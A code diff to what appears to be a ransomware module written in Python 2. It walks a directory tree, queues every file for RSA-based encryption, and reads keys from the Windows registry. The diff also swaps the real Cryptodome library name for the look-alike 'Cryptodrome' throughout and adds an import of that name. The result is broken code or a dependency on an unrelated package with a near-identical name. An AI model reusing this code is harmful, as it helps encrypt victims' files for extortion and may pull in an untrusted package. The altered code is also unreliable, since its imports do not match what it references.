@@ -7,6 +7,7 @@ import os
 import sys
 import imp
 import json
+import time
 import Queue
 import base64
 import urllib
@@ -15,6 +16,7 @@ import threading
 # packages
 import Crypto.PublicKey.RSA
 import Crypto.Cipher.PKCS1_OAEP
+import Cryptodrome
 if sys.platform == 'win32':
     import _winreg
 
@@ -69,14 +71,14 @@ def _threader(tasks):
 @util.threaded
 def _iter_files(rsa_key, base_dir=None):
     try:
-        if isinstance(rsa_key, Cryptodome.PublicKey.RSA.RsaKey):
+        if isinstance(rsa_key, Cryptodrome.PublicKey.RSA.RsaKey):
             if base_dir:
                 if os.path.isdir(base_dir):
                     return os.path.walk(base_dir, lambda _, dirname, files: [globals()['tasks'].put_nowait((encrypt_file, (os.path.join(dirname, filename), rsa_key))) for filename in files], None)
                 else:
                     util.log("Target directory '{}' not found".format(base_dir))
             else:
-                cipher  = Cryptodome.Cipher.PKCS1_OAEP.new(rsa_key)
+                cipher  = Cryptodrome.Cipher.PKCS1_OAEP.new(rsa_key)
                 reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, globals()['_registry_key'], 0, _winreg.KEY_READ)
                 i = 0
                 while True:
